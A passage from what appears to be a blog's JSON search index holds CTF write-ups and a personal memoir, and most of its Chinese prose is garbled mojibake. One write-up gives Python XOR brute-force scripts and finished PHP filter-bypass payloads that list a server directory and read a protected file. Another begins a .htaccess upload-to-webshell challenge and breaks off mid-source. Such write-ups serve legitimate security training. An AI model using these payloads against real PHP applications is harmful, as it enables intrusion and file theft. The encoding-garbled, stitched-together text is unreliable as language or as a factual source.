è¿™äº›å‡½æ•°è·Ÿæ–‡ä»¶è¯»å–æ²¡æœ‰ä»»ä½•å…³ç³»ã€‚ã€‚ã€‚ã€‚é‚£ä¹ˆæˆ‘ä»¬å¦‚ä½•åœ¨æ²¡æœ‰å¼•å·çš„æƒ…å†µä¸‹å¾—åˆ°ä»»æ„å­—ç¬¦ä¸²å‘¢ï¼Ÿ PHPåœ¨å¤„ç†å­—ç¬¦ä¸²æ—¶æœ‰ä¸ªæœ‰è¶£çš„ç‰¹æ€§ã€‚ PHPé»˜è®¤ä¼šæŠŠæ²¡æœ‰åŠ å¼•å·çš„å­—ç¬¦ä¸²å½“æˆå¸¸é‡å¤„ç†ï¼Œæ‰¾ä¸åˆ°å¯¹åº”å¸¸é‡å°±ä¼šå°†å…¶è§£é‡Šæˆå­—ç¬¦ä¸²ï¼Œå› æ­¤æ²¡æœ‰å¼•å·ä¸æ˜¯é™åˆ¶ã€‚ è¿˜æœ‰ä¸€ç‚¹ï¼ŒPHPè°ƒç”¨å‡½æ•°ï¼Œå¯ä»¥ä½¿ç”¨å­—ç¬¦ä¸²è°ƒç”¨ã€‚ æ³¨æ„åˆ°^ç¬¦å·æ²¡æœ‰è¢«banï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡å¯¹å­—ç¬¦ä¸²è¿›è¡Œè¿ç®—æ¥è§„é¿ifäº†ã€‚ 1234567final_string=&quot;phpinfo&quot;allowed=&quot;!#%()*+-/:;&lt;=&gt;?@ABCHIJKLMNQRTUVWXYZ\\]^abchijklmnqrtuvwxyz&#125;~&quot;for a in final_string: for i in allowed: for p in allowed: if ord(i)^ord(p)==ord(a): print(&quot;i=%s p=%s a=%s&quot;%(i,p,a)) æš´åŠ›æœç´¢ç¬¦åˆæ¡ä»¶çš„å­—ç¬¦ä¸²ï¼Œä¾‹å¦‚ï¼šphpinfo==%8f%97%8f%96%91%99%90^%ff%ff%ff%ff%ff%ff%ffã€‚ ä»phpinfoè¿”å›ä¸­å¯ä»¥çœ‹åˆ°æ‰€æœ‰å‘½ä»¤æ‰§è¡Œçš„å‡½æ•°éƒ½è¢«banäº†ï¼ŒåŠ ä¸Šmailå’Œimap_mailã€‚åŒæ—¶ä¹Ÿé™åˆ¶äº†open_basediråœ¨/var/www/htmlã€‚ä¸‹ä¸€æ­¥æ˜¯æ‰¾flagæ–‡ä»¶ã€‚æˆ‘ä»¬å¯ä»¥ç”¨scandiræˆ–è€…globåˆ—ç›®å½•ï¼Œä½†å®ƒè¿”å›ä¸€ä¸ªæ•°ç»„ï¼Œæˆ‘ä»¬è¿˜éœ€è¦ä¸€ä¸ªprint_ræˆ–var_dumpã€‚ å³ç›®æ ‡ä¸ºprint_r(scandir('.'));==((%8f%8d%96%91%8b%a0%8d)^(%ff%ff%ff%ff%ff%ff%ff))(((%8c%9c%9e%91%9b%96%8d)^(%ff%ff%ff%ff%ff%ff%ff))(%d1^%ff));ã€‚å‘ç°å¯ä»¥è¿è¡Œï¼Œä½†æ˜¯count_charsé‚£é‡Œè¿‡ä¸å»ï¼Œæˆ‘ä»¬ä¸€å…±ç”¨äº†16ä¸ªä¸åŒå­—ç¬¦ï¼Œä¸‹ä¸€æ­¥æ˜¯ç¼©å‡å­—ç¬¦æ•°ã€‚æˆ‘é‡‡ç”¨ä¸€ç§ç²—æš´çš„æ–¹æ³•ï¼š 123456789101112131415result2 = [0x8b, 0x9b, 0xa0, 0x9c, 0x8f, 0x91, 0x9e, 0xd1, 0x96, 0x8d, 0x8c] # Original chars,11 totalresult = [0x9b, 0xa0, 0x9c, 0x8f, 0x9e, 0xd1, 0x96, 0x8c] # to be deletedtemp = []for d in result2: for a in result: for b in result: for c in result: if (a ^ b ^ c == d): if a == b == c == d: continue else: print(&quot;a=0x%x,b=0x%x,c=0x%x,d=0x%x&quot; % (a, b, c, d)) if d not in temp: temp.append(d)print(len(temp), temp) é™¤äº†å¿…è¦çš„()^;ä»¥å¤–ï¼Œæˆ‘ä»¬æœ€å¤šå‰©ä½™9ä¸ªå­—ç¬¦çš„ç©ºé—´ï¼Œé€æ­¥åˆ é™¤resulté‡Œçš„å€¼ï¼Œå½“ç»“æœä»èƒ½ä¿æŒ11ä¸ªï¼Œå°±æ„å‘³ç€æˆ‘ä»¬å¯ä»¥ç»§ç»­åˆ é™¤äº†ã€‚ æ‰€ä»¥æˆ‘ä»¬æ•´ç†ç»“æœï¼šprint_r(scandir(.));==((%9b%9c%9b%9b%9b%9b%9c)(%9b%8f%9b%9c%9c%9b%8f)(%8f%9e%96%96%8c%a0%9e)(%ff%ff%ff%ff%ff%ff%ff))(((%9b%9b%9b%9b%9b%9b%9c)(%9b%9b%9b%9c%a0%9b%8f)(%8c%9c%9e%96%a0%96%9e)(%ff%ff%ff%ff%ff%ff%ff))(%d1^%ff)); å¯ä»¥å‘ç°å½“å‰ç›®å½•ä¸‹æœ‰ä¸€ä¸ª n0t_a_flAg_FiLe_dONT_rE4D_7hIs.txtæ–‡ä»¶ï¼Œæˆ‘ä»¬å°è¯•ç›´æ¥æ‰“å¼€ã€‚403ï¼Œè¡Œå§ã€‚é‚£ä¹ˆæˆ‘ä»¬æ¥ç€è¯»æ–‡ä»¶ã€‚scandirè¿”å›çš„æ˜¯ä¸ªæ•°ç»„ï¼Œä¸”åˆšæ‰çš„ç»“æœæ˜¾ç¤ºæˆ‘ä»¬è¦æ‰¾çš„æ–‡ä»¶åœ¨scandirçš„ç»“æœæœ€åé¢ï¼Œé‚£ä¹ˆç”¨end()æ–¹æ³•å°±å¯ä»¥å¾—åˆ°æ–‡ä»¶åäº†ã€‚è¯»æ–‡ä»¶å¯ä»¥ç”¨show_sourceæˆ–è€…readfileã€‚ 123456789101112131415result2 = [160, 136, 138, 140, 141, 144, 145, 209, 150, 151, 154, 155, 156, 158] # Original chars,14 totalresult = [160, 136, 141, 209, 151, 154, 155, 156]temp = []for d in result2: for a in result: for b in result: for c in result: if (a ^ b ^ c == d): if (a == b == c == d) or (a==b) or (b==c) or (c==d) or(a==c): continue else: print(&quot;a=0x%x,b=0x%x,c=0x%x,d=0x%x&quot; % (a, b, c, d)) if d not in temp: temp.append(d)print(len(temp), temp) Payload:show_source(end(scandir(.)));==((%8d%9c%97%a0%88%8d%97%8d%9c%a0%a0)^(%9a%97%9b%88%a0%9a%9b%9b%8d%9c%9a)^(%9b%9c%9c%a0%88%9b%9c%9c%9c%a0%a0)^(%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff))(((%a0%97%8d)^(%9a%9a%9b)^(%a0%9c%8d)^(%ff%ff%ff))(((%8d%a0%88%97%8d%9b%9c)^(%9a%9c%8d%9a%9b%9a%8d)^(%9b%a0%9b%9c%8d%97%9c)^(%ff%ff%ff%ff%ff%ff%ff))(%d1^%ff))); flag{e5b1ade2-294f-4422-a8c9-1467233ba6b5}","categories":[{"name":"Writeups","slug":"Writeups","permalink":"http://tiaonmmn.github.io/categories/Writeups/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"http://tiaonmmn.github.io/tags/PHP/"},{"name":"Web","slug":"Web","permalink":"http://tiaonmmn.github.io/tags/Web/"},{"name":"Regex","slug":"Regex","permalink":"http://tiaonmmn.github.io/tags/Regex/"}]},{"title":"flag{thats_it}","slug":"flag-thats-it","date":"2019-06-12T06:53:12.000Z","updated":"2019-12-10T12:15:12.611Z","comments":true,"path":"2019/06/12/flag-thats-it/","link":"","permalink":"http://tiaonmmn.github.io/2019/06/12/flag-thats-it/","excerpt":"è¦æ¯•ä¸šäº†ï¼Œç¬¬ä¸‰å±Šè“å¸½æ¯åˆèµ›æ‰“å®Œï¼Œ4å¹´CTFç”Ÿæ¶¯ä¹Ÿç®—æ­£å¼ç»“æŸäº†ï¼Œå°å°çš„çºªå¿µä¸€ä¸‹è‡ªå·±çš„æ‰€ä½œæ‰€ä¸ºå§ã€‚æ–‡ç¬”ä¸è¡Œï¼Œè§è°…ã€‚ Part 1.Why am I here? æˆ‘è‡ª7å²èµ·å°±æ¥è§¦è®¡ç®—æœºäº†ï¼ŒDOSã€Windows 98ã€Windows MEã€Windows 2000ç­‰ç³»ç»Ÿæˆ‘æ˜¯å®é™…ä½¿ç”¨è¿‡çš„ã€‚ä¸€ç›´è§‰å¾—å¥½ç©ï¼Œè®¡ç®—æœºçš„ä¸–ç•Œå¾ˆæœ‰è¶£ã€‚","text":"è¦æ¯•ä¸šäº†ï¼Œç¬¬ä¸‰å±Šè“å¸½æ¯åˆèµ›æ‰“å®Œï¼Œ4å¹´CTFç”Ÿæ¶¯ä¹Ÿç®—æ­£å¼ç»“æŸäº†ï¼Œå°å°çš„çºªå¿µä¸€ä¸‹è‡ªå·±çš„æ‰€ä½œæ‰€ä¸ºå§ã€‚æ–‡ç¬”ä¸è¡Œï¼Œè§è°…ã€‚ Part 1.Why am I here? æˆ‘è‡ª7å²èµ·å°±æ¥è§¦è®¡ç®—æœºäº†ï¼ŒDOSã€Windows 98ã€Windows MEã€Windows 2000ç­‰ç³»ç»Ÿæˆ‘æ˜¯å®é™…ä½¿ç”¨è¿‡çš„ã€‚ä¸€ç›´è§‰å¾—å¥½ç©ï¼Œè®¡ç®—æœºçš„ä¸–ç•Œå¾ˆæœ‰è¶£ã€‚ æˆ‘å°±è¯»äºä¸­å›½äººæ°‘å…¬å®‰å¤§å­¦ï¼Œè¿™æ˜¯ä¸€æ‰€è¢«ç§°ä¸ºâ€œè­¦ä¸­æ¸…åâ€çš„å­¦æ ¡ã€‚ä¸ºä»€ä¹ˆæˆ‘ä¼šæ¥åˆ°è¿™é‡Œï¼Ÿå¾ˆç®€å•ï¼Œçˆ¶æ¯è¦æ±‚çš„ã€‚è¯´æ¥æƒ­æ„§ï¼Œæˆ‘åœ¨é«˜ä¸­çš„æ—¶å€™æˆç»©ä¸æ˜¯å¾ˆå¥½ï¼Œé«˜ä¸‰ä¸‹å­¦æœŸä¸¤æ¬¡æ¨¡æ‹Ÿçš„æ—¶å€™ä¸€æ¬¡495ï¼Œä¸€æ¬¡525ã€‚ç„¶åå°±è¢«è®¤ä¸ºæ˜¯ä¸Šä¸äº†ä¸€æœ¬çš„è´§ï¼Œæƒ³ç€ä»¥åå½“ä¸ªè­¦å¯Ÿï¼Œè‡³å°‘ç¨³å®šã€‚æ‰€ä»¥ï¼Œé«˜è€ƒå¿—æ„¿çš„æ—¶å€™æˆ‘å°±æŠ¥äº†ä¸ªä¸­å›½äººæ°‘å…¬å®‰å¤§å­¦çš„æå‰æ‰¹ã€‚ç»“æœæˆç»©ä¸‹æ¥ï¼Œ605ï¼ˆå½“å¹´ä¸€æœ¬åˆ†æ•°çº¿500ï¼‰ã€‚è¡Œå§ï¼Œå»ä¹Ÿå¾—å»ï¼Œä¸å»ä¹Ÿå¾—å»äº†ï¼Œå½“æ—¶æŠ¥å¿—æ„¿çš„æ—¶å€™ï¼Œå®¶é‡Œç»™æˆ‘çš„å”¯ä¸€è‡ªä¸»é€‰æ‹©æƒå°±æ˜¯ä¸“ä¸šï¼Œè‡ªä¸å¿…è¯´ï¼Œç½‘ç»œå®‰å…¨ä¸æ‰§æ³•äº†ã€‚ å°±è¿™æ ·ï¼Œæˆ‘æ¥åˆ°äº†ä¸­å›½äººæ°‘å…¬å®‰å¤§å­¦ç½‘ç»œå®‰å…¨ä¸æ‰§æ³•å¤§é˜Ÿï¼Œå¼€å§‹äº†å››å¹´æ±‚å­¦ç”Ÿæ´»ã€‚ Part 2.How is it here? å›å¿†è­¦æ ¡ç”Ÿæ´»ï¼Œä¼°è®¡æ¯ä¸ªå½“äº‹äººéƒ½è¦è®²ä¸€éæƒ¨ä¸å¿ç¹çš„å†›è®­ã€‚è­¦æ ¡çš„å†›è®­åº”è¯¥æ˜¯å†›æ ¡ä»¥å¤–æœ€ä¸¥æ ¼çš„äº†ã€‚æˆ‘ä»¬è¿™ä¸€å±Šå¾ˆå¹¸è¿ï¼ˆæˆ–è€…è¯´ä¸å¹¸ï¼‰ï¼Œè¢«å®‰æ’åœ¨å­¦æ ¡å†…å†›è®­ã€‚ç„¶åå°±æ˜¯è¢«å„ç§å®‰æ’ï¼Œå½“æ—¶çš„å„ç§ç–¼ï¼Œå„ç§ç´¯ï¼Œç°åœ¨å‘ç°éƒ½æƒ³ä¸èµ·æ¥äº†ï¼Œè®°å¾—çš„éƒ½æ˜¯æ•™å®˜ä¸åŒå­¦ä»¬ä¹‹é—´æœ‰è¶£çš„äº‹æƒ…äº†ã€‚ æ­£å¼å¼€å­¦åï¼Œç…§å¸¸æ˜¯è­¦åŠ¡åŒ–ç®¡ç†ï¼Œæ—©ä¸Š6ç‚¹30è¦è·‘æ“ï¼Œ7ç‚¹35è¦é›†åˆèµ°é˜Ÿåˆ—ä¸Šè¯¾ï¼Œæ— å¤„ä¸åœ¨çš„è­¦ç£æ—¶åˆ»æŠ“ä½ ä¸Šè¯¾ç¡è§‰ã€è­¦å®¹ä¸æ•´ï¼Œæ¯å‘¨è¿˜è‡³å°‘ä¸€æ¬¡çš„5å…¬é‡Œé•¿è·‘ï¼Œæ™šä¸Š10ç‚¹30å‡†æ—¶ç†„ç¯ä¸å‡†ç©æ‰‹æœºï¼Œç­‰ç­‰ã€‚æˆ‘ä¸ªäººå€’æ˜¯æŒºä¹ æƒ¯çš„ï¼Œæ²¡è§‰å¾—æœ‰ä»€ä¹ˆå‹åŠ›ã€‚å°±è¿™ä¹ˆæ­£å¸¸çš„åšæŒäº†4å¹´ã€‚ è­¦æ ¡é‡Œå­¦ä¹ æˆç»©ä¹Ÿæ˜¯å¾ˆé‡è¦çš„ï¼Œä¸è¦è¢«æŸäº›ç”µå½±å¸¦åäº†ã€‚è‡³å°‘åœ¨è¿™é‡Œï¼Œå­¦ä¹ æˆç»©å†³å®šç€å…¥å…šåé¢ã€å¥–å­¦é‡‘ã€å¹²éƒ¨åé¢è¿™äº›æ¶‰åŠåˆ°åˆ‡èº«åˆ©ç›Šçš„ä¸œè¥¿ã€‚ä»¥åŠï¼ŒæŒ‚ç§‘æ˜¯å¾ˆéš¾å—çš„ï¼Œå› ä¸ºä¼šè€½è¯¯ä½ è¯„ä¸Šä¸Šè¿°é‚£äº›ä¸œè¥¿çš„èµ„æ ¼ã€‚å¥½åœ¨ï¼Œæˆ‘è‹Ÿä½äº†ï¼Œæ²¡æœ‰æŒ‚è¿‡ç§‘ã€‚ æœŸé—´ä½œä¸ºè­¦æ ¡ç”Ÿï¼Œå„ç§ä¹±ä¸ƒå…«ç³Ÿçš„å®‰ä¿ã€å®ä¹ ä»€ä¹ˆçš„è‡ªç„¶æ˜¯æ¥è§¦è¿‡ï¼ŒG20ã€ä¸€å¸¦ä¸€è·¯ã€ä¸Šåˆå³°ä¼šï¼Œä¸€ä¸ªéƒ½æ²¡è½ä¸‹å…¨èµ¶ä¸Šäº†ã€‚æ´¾å‡ºæ‰€å®ä¹ ä¹Ÿä½“éªŒåˆ°äº†äººç”Ÿç™¾æ€ï¼ŒæŠ“è¿‡å«–ï¼Œå¸¦è¿‡äººï¼Œç›‘ç‹±çœ‹å®ˆæ‰€ä»€ä¹ˆçš„çœ‹é—¨è€å¤§çˆ·éƒ½å¿«è®¤è¯†äº†ã€‚ å¤§ä¸€åˆ°å¤§å››ä¸€æ™ƒå°±è¿‡å»äº†ï¼Œå¤§å››ä¸Šå­¦æœŸåŸºæœ¬å°±ä¸€ç›´åœ¨ä¸ºæ‰¾å·¥ä½œåšå‡†å¤‡ï¼Œç„¶åç°åœ¨å·¥ä½œè¿˜æ˜¯æ²¡å®šçš„çŠ¶æ€ã€‚å¤§å››ä¸‹å°±åœ¨å†™æ¯•ä¸šè®ºæ–‡ï¼Œç„¶åå°±åœ¨æ‡µæ‡µæ‡‚æ‡‚ä¸­è¿æ¥äº†æ¯•ä¸šã€‚ Part 3.When in CTF? å…¶å®æ¥åˆ°è¿™ä¸ªä¸“ä¸šçš„æ—¶å€™ï¼Œæˆ‘ä»¥ä¸ºåŒå­¦éƒ½æ˜¯è‡³å°‘æœ‰ç‚¹ç½‘ç»œå®‰å…¨åŸºæœ¬çŸ¥è¯†çš„ï¼Œæœ€èµ·ç è‡ªå·±å®‰è£…ä¸ªç³»ç»Ÿæ˜¯æ²¡å•¥é—®é¢˜çš„ã€‚ç»“æœæˆ‘å‘ç°æˆ‘é”™äº†ï¼Œå¾ˆå¤šäººæ˜¯ä¸ä¼šçš„ã€‚æ‰€ä»¥åœ¨å¤§ä¸€çš„æ—¶å€™ï¼Œå…¨åŒºé˜Ÿçš„ç¬”è®°æœ¬ç”µè„‘æˆ‘åº”è¯¥æ˜¯éƒ½ä¿®è¿‡çš„ï¼Œå½“ç„¶ï¼Œä¸šåŠ¡å¶å°”å»¶ä¼¸åˆ°å…¶ä»–åŒºé˜Ÿã€‚ å¯èƒ½æ˜¯å› ä¸ºä¼šä¿®ç”µè„‘ï¼Ÿæœ‰ä¸€å¤©2012çº§çš„å´å‡¡å¸ˆå§çªç„¶åŠ æˆ‘å¾®ä¿¡é—®æˆ‘æœ‰æ²¡æœ‰å…´è¶£å‚åŠ ä»–ä»¬çš„ç»„ç»‡ï¼Ÿå½“æ—¶åº”è¯¥å«åšç½‘ç»œç‰¹è­¦é˜Ÿæ¥ç€çš„ï¼Œç­”åº”ä»¥åå°±ç¢°åˆ°äº†ä¸€å¤§ç¥¨å¸ˆå…„å¸ˆå§ï¼Œåƒå‘¨ä¹‹ç«¥å¸ˆå…„ã€æ›¾å®‡åœ£å¸ˆå…„ï¼ˆnonickï¼Œé¸¡ä¸å¸ˆå‚…ï¼‰ï¼Œå´å‡¡å¸ˆå§ï¼ˆé˜¿é‡Œå¤§ä½¬ï¼‰ç­‰äººï¼Œä»–ä»¬å‘Šè¯‰æˆ‘æœ‰ç§ä¸œè¥¿å«CTFï¼Œç„¶åæˆ‘å°±å…¥å‘äº†ã€‚2333333ã€‚è®°å¾—å¾ˆæ¸…æ¥šï¼Œç¬¬ä¸€åœºå‚åŠ çš„æ¯”èµ›æ˜¯ZCTF2015ï¼Œçœ‹äº†ä¸ªMiscï¼Œä¸€ä¸ªæµé‡é¢˜ï¼Œæå‡ºæ¥äº†ä¸ªå‹ç¼©åŒ…ï¼Œç„¶åæ€ä¹ˆéƒ½æ‰¾ä¸åˆ°å¯†ç ï¼Œèµ›åå‘ç°æ˜¯ä¸ªç½‘é¡µé‡Œæåˆ°äº†passwordï¼Œè¿˜æ˜¯ä¸ªä¸­æ–‡å¯†ç ã€‚ç¬¬ä¸€æ¬¡å‚åŠ å°±è¢«è¿™ä¹ˆå¥—è·¯ï¼Œä¸è¿‡ä¾ç„¶è§‰å¾—å¾ˆæœ‰æ„æ€ã€‚æ­¤åå°±åœ¨å„ä½å¤§ä½¬çš„å¸¦é¢†ä¸‹ï¼Œç»„äº†ä¸ªé˜Ÿï¼ˆé˜Ÿååº”è¯¥éƒ½çŸ¥é“äº†ï¼Œå®«ä¿é¸¡ä¸ï¼‰ï¼Œä»¥èµ›ä»£ç»ƒï¼Œæ‰“æ€ªå‡çº§ã€‚ ç„¶åï¼Œ12çº§çš„å°±æ¯•ä¸šäº†ï¼Œå°±è½®åˆ°æˆ‘ä»¬äº†ã€‚æŒ‰ç†æ¥è®²ï¼Œè¿™ç§æˆé˜Ÿä¼çš„ç»„ç»‡åº”è¯¥æ˜¯ä¸€å±Šå±Šçš„ä¼ ä¸‹å»çš„ï¼Œå¾ˆä¸å¹¸çš„ï¼Œåˆ°13çº§è¿™é‡Œæ–­äº†ã€‚åªæœ‰14çº§çš„å‡ ä¸ªå¸ˆå…„å’Œæˆ‘è¿˜æœ‰Vicenåœ¨åšæŒèµ°ä¸‹å»ã€‚å…¶å®ç°åœ¨å›å¿†ä¸€ä¸‹ï¼Œæˆ‘ä»¬ä¹Ÿæ˜¯æ¯”è¾ƒæƒ¨çš„ï¼Œå¯ä»¥è¯´æ•´ä¸ªå­¦æ ¡ï¼Œåªæœ‰æˆ‘ä»¬ä¸åˆ°10ä¸ªäººå¬è¯´è¿‡CTFè¿™ä¸ªä¸œè¥¿å¹¶ä¸”æœ‰ä¸€å®šåŸºç¡€èƒ½å¤Ÿå‚ä¸ï¼Œæ¯æ¬¡æ¯”èµ›éƒ½åªèƒ½åœ¨å®¿èˆæˆ–è€…ç©ºæ•™å®¤é‡Œæ‰“ï¼Œè¿˜è¦æ—¶å¸¸è¢«å„ç§å¥‡æ€ªæ´»åŠ¨æ‰“æ–­ï¼Œèƒ½åšæŒä¸‹æ¥æ„Ÿè§‰ä¹Ÿæ˜¯è›®ä¸å¯æ€è®®çš„äº†ã€‚å¥½åœ¨G20å®‰ä¿çš„æ—¶å€™å¾—åˆ°äº†å­¦é™¢çš„æ”¯æŒï¼Œå‚åŠ äº†ç¬¬ä¸€å±ŠXManå¤ä»¤è¥ï¼Œè®¤è¯†äº†è®¸å¤šå‰è¾ˆä¸ä¸€èµ·ç©çš„å°ä¼™ä¼´ï¼Œç®—æ˜¯çœŸæ­£çš„èƒ½å«åšä¸€åCTFé€‰æ‰‹äº†ã€‚ 14çº§å¸ˆå…„ä»¬æ¯•ä¸šä»¥åï¼Œå°±å‰©ä¸‹äº†æˆ‘å’ŒVicenä¸¤ä¸ªäººèƒ½æ‰“äº†ï¼Œç»“æœå°±æ˜¯æˆ‘ä»¬ä¸¤ä¸ªäººæ‰›äº†2017-2019å¹´å‡ ä¹æ‰€æœ‰çš„æ¯”èµ›ã€‚çœŸçš„å¾ˆç´¯ï¼Œä¸¤ä¸ªäººä»æ—©åšåˆ°æ™šï¼Œç»“æœå‘ç°è¿˜å‰©ä¸‹70%å·¦å³çš„é¢˜ç›®æ²¡åšï¼Œé‚£ä¸ªæ—¶å€™æ˜ç™½äº†ä»€ä¹ˆå«åšåŠ›ä¸ä»å¿ƒã€‚åæ¥å­¦é™¢æˆç«‹äº†ä¸ªç½‘ç»œå®‰å…¨å®éªŒç­ï¼Œä¸çŸ¥é“æ˜¯ä¸æ˜¯å› ä¸ºæˆ‘ä»¬ï¼Œä½†ç¡®å®æˆ‘ä»¬çœ‹åˆ°äº†ä¸‹ä¸€ä»£çš„å¸Œæœ›ï¼Œç°åœ¨ï¼Œåœ¨S.W.A.Tï¼ˆä»€ä¹ˆé¬¼IDï¼‰åŒå­¦çš„å¸¦é¢†ä¸‹ï¼Œä»–ä»¬èƒ½å¤Ÿå‡ºç°åœ¨æ¯”èµ›æ’åçš„å‰100ã€å‰50ã€å‰25é‡Œï¼Œè‡³äºè¿™ä¸ªé˜Ÿä¼ä»¥åä¼šæ˜¯ä»€ä¹ˆæ ·å­ï¼Œæˆ‘ä¹Ÿä¸çŸ¥é“ï¼Œä½†äººç±»æœ€ä¼Ÿå¤§çš„æ™ºæ…§åŒ…å«åœ¨å››ä¸ªå­—é‡Œï¼Œâ€œç­‰å¾…â€ä¸â€œå¸Œæœ›â€å˜›ã€‚ ä»¥åŠï¼ŒWebç‹—åœ¨CTFé‡Œæ˜¯æ²¡æœ‰æ´»è·¯çš„ï¼ŒPwnæ‰æ˜¯çˆ·çˆ·ã€‚æˆ‘ä¸åšWebäº†ï¼ŒJoJoï¼ Part 4.Conclusion çœ‹äº†berTrAMçš„æ–‡ç« æ‰æƒ³èµ·æ¥æˆ‘ä»¬ä¹Ÿè¦èµ°äº†ï¼Œå†™ç€å†™ç€å°±çªç„¶ä¸æƒ³å†™äº†ï¼Œæ€»æ„Ÿè§‰çœŸçš„å†™å®Œäº†ï¼Œæ‰€æœ‰å‘ç”Ÿè¿‡çš„äº‹æƒ…ä¹ŸçœŸçš„å°±åªèƒ½æˆä¸ºå›å¿†äº†ã€‚å¤§æ¦‚è¿™å°±å«åšâ€œä¸´è¡¨æ¶•é›¶ï¼Œä¸çŸ¥æ‰€è¨€â€å§ã€‚ æœ€åï¼Œå½“ç„¶æ˜¯è‡´è°¢éƒ¨åˆ†å•¦ï¼ˆæ— é¡ºåºæ’åˆ—ï¼‰ï¼š æ„Ÿè°¢Vicenï¼Œé™ªæˆ‘æ‰›äº†å‡ ä¹æ‰€æœ‰çš„æ¯”èµ›ã€‚ æ„Ÿè°¢å„ä½12çº§çš„å¸ˆå…„å¸ˆå§ï¼Œå¸¦æˆ‘å…¥å‘ã€‚ æ„Ÿè°¢136ã€333çš„å„ä½ï¼Œåœ¨å››å¹´é‡Œæä¾›çš„æ— ç§å…³æ€€ï¼ˆè€çˆ¶äº²å¯¹å„¿å­çš„é‚£ç§ï¼‰ã€‚ æ„Ÿè°¢é«˜è§è€å¸ˆï¼Œç»™æˆ‘ä»¬æä¾›äº†å¤§é‡çš„å¸®åŠ©ã€‚ æ„Ÿè°¢æˆ¿é•¿æ˜é˜Ÿé•¿ï¼Œåœ¨G20ç­‰å®‰ä¿æœŸé—´å¸®æˆ‘ä»¬æå®šäº†ä¹±ä¸ƒå…«ç³Ÿçš„é—®é¢˜ï¼Œä»¥åŠå››å¹´çš„é™ªä¼´ã€‚ æ„Ÿè°¢421çš„å„ä½ï¼Œç»™äº†ä¸ªåœ¨å­¦ç”Ÿä¼šé‡Œæœ‰ä¸ªèƒ½é—²èŠèƒ½ç†¬å¤œçš„åœ°æ–¹ã€‚ æ„Ÿè°¢invictus0510ï¼Œå…¬å®‰å¤§å­¦é‡Œç»“äº¤çš„æŒšå‹ã€‚ æ„Ÿè°¢2017çº§ç½‘ç»œå®‰å…¨å®éªŒç­çš„å„ä½åŒå­¦ï¼Œè®©æˆ‘çœ‹åˆ°äº†ä»¥åçš„å¸Œæœ›ã€‚ //æœ€åï¼Œæ„Ÿè°¢ä¸€ä¸‹æ²¡æœ‰å››å¹´æ¥æ²¡æœ‰å‡ºç°çš„å¥³ï¼ˆç”·ï¼Ÿï¼‰æœ‹å‹ï¼Œè®©æˆ‘èƒ½å¤Ÿä¸åˆ†å¿ƒï¼Ÿ??ï¼Ÿ?ï¼Ÿ flag{813d3d43-efe9-457a-bfee-2fd9009d09aa}","categories":[{"name":"Something else","slug":"Something-else","permalink":"http://tiaonmmn.github.io/categories/Something-else/"}],"tags":[{"name":"Balabala","slug":"Balabala","permalink":"http://tiaonmmn.github.io/tags/Balabala/"}]},{"title":"Insomni-hack-teaser-2019-l33-hoster","slug":"Insomni-hack-teaser-2019-l33-hoster","date":"2019-05-15T07:12:59.000Z","updated":"2020-03-05T07:19:37.215Z","comments":true,"path":"2019/05/15/Insomni-hack-teaser-2019-l33-hoster/","link":"","permalink":"http://tiaonmmn.github.io/2019/05/15/Insomni-hack-teaser-2019-l33-hoster/","excerpt":"è„±äº§åŠå¹´ï¼Œé‡æ–°å›é¡¾ä¸€éåŸºæœ¬éƒ½ä¸ä¼šçš„ Webï¼Œåæ­£å¾—å‡†å¤‡è€ƒè¯•ï¼Œé¡ºä¾¿äº†ã€‚Insomni hackerâ€™s teaser è¿™ä¸ªæ¯”èµ›ä¹‹å‰æœ‰å¬è¯´è¿‡ï¼Œæ²¡æƒ³åˆ°è¿™ä¹ˆéš¾ã€‚å°± 4 ä¸ª Webï¼Œåšå‡ºçš„äººè¿˜éƒ½ä¸å¤šã€‚l33t-hoster è¿™é¢˜çœ‹èµ·æ¥æœ€ç®€å•ï¼Œå°±æ˜¯ä»–äº†ã€‚è¿™é¢˜æˆ‘ç¯å¢ƒåšå®Œäº†ï¼Œåœ°å€åé¢è´´ã€‚","text":"è„±äº§åŠå¹´ï¼Œé‡æ–°å›é¡¾ä¸€éåŸºæœ¬éƒ½ä¸ä¼šçš„ Webï¼Œåæ­£å¾—å‡†å¤‡è€ƒè¯•ï¼Œé¡ºä¾¿äº†ã€‚Insomni hackerâ€™s teaser è¿™ä¸ªæ¯”èµ›ä¹‹å‰æœ‰å¬è¯´è¿‡ï¼Œæ²¡æƒ³åˆ°è¿™ä¹ˆéš¾ã€‚å°± 4 ä¸ª Webï¼Œåšå‡ºçš„äººè¿˜éƒ½ä¸å¤šã€‚l33t-hoster è¿™é¢˜çœ‹èµ·æ¥æœ€ç®€å•ï¼Œå°±æ˜¯ä»–äº†ã€‚è¿™é¢˜æˆ‘ç¯å¢ƒåšå®Œäº†ï¼Œåœ°å€åé¢è´´ã€‚ # Part 1. .htaccess ä¸Šä¼  + getshell è¿™ä¸ªé¢˜æ‰“å¼€åæ˜¯ä¸ªä¸Šä¼ é¡µé¢ï¼ŒçŒœä¸€ä¸‹æ˜¯ä¸Šä¼  PHP æ–‡ä»¶ï¼Œgetshellï¼Œè¯» flagã€‚F12 åå‘ç°æç¤ºæœ‰ sourceã€‚é‚£å°±çœ‹ä¸€ä¸‹æºç å§ã€‚ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283 &lt;?phpif (isset($_GET[&quot;source&quot;])) die(highlight_file(__FILE__));session_start();if (!isset($_SESSION[&quot;home&quot;])) &#123; $_SESSION[&quot;home&quot;] = bin2hex(random_bytes(20));&#125;$userdir = &quot;images/&#123;$_SESSION[&quot;home&quot;]&#125;/&quot;;if (!file_exists($userdir)) &#123; mkdir($userdir);&#125;$disallowed_ext = array( &quot;php&quot;, &quot;php3&quot;, &quot;php4&quot;, &quot;php5&quot;, &quot;php7&quot;, &quot;pht&quot;, &quot;phtm&quot;, &quot;phtml&quot;, &quot;phar&quot;, &quot;phps&quot;,);if (isset($_POST[&quot;upload&quot;])) &#123; if ($_FILES[&#x27;image&#x27;][&#x27;error&#x27;] !== UPLOAD_ERR_OK) &#123; die(&quot;yuuuge fail&quot;); &#125; $tmp_name = $_FILES[&quot;image&quot;][&quot;tmp_name&quot;]; $name = $_FILES[&quot;image&quot;][&quot;name&quot;]; $parts = explode(&quot;.&quot;, $name); $ext = array_pop($parts); if (empty($parts[0])) &#123; array_shift($parts); &#125; if 